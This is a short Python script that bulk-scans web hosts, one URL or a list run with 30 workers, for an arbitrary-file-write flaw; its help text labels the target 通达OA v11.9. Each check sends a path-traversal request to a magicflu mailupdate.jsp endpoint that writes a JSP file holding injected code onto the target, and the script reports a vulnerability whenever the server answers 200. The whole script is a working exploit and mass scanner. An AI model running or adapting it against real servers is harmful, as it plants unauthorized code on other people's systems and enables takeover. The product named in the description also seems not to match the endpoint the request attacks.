import requests
import argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool


def main():
    banner = """
    _   _        .      .      |           #   ___          _   _        .      .       _   _     
   (_)-(_)     .  .:::.        |.===.      #  <_*_>        (_)-(_)     .  .:::.        '\\-//`    
    (o o)        :(o o):  .    {}o o{}     #  (o o)         (o o)        :(o o):  .     (o o)     
ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo--8---(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-
"""
    print(banner)
    parser = argparse.ArgumentParser(description='通达OA v11.9')
    parser.add_argument('-u','--url', type=str, help='输入要检测URL')
    parser.add_argument('-f','--file', type=str, help='输入要批量检测的文本')
    args = parser.parse_args()
    url = args.url
    file = args.file
    targets = []
    if url:
        check(args.url)
    elif file:
        f = open(file, 'r')
        for i in f.readlines():
            i = i.strip()
            if 'http' in i:
                targets.append(i)
            else:
                i = f"http://{i}"
                targets.append(i)
    pool = Pool(30)
    pool.map(check, targets)
    pool.close()
def check(target):
    headers = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)'
    }
    try:
        response = requests.get(f'{target}/magicflu/html/mail/mailupdate.jsp?messageid=/../../../test1.jsp&messagecontent=%3C%25+out.println%28%22tteesstt1%22%29%3B%25%3E',headers=headers,verify=False,timeout=5)
        if response.status_code == 200:
            print(f"[***]{target}存在漏洞")
        else:
            print(f"[!]{target}不存在漏洞")
    except Exception as e:
        pass
if __name__ == '__main__':
    main()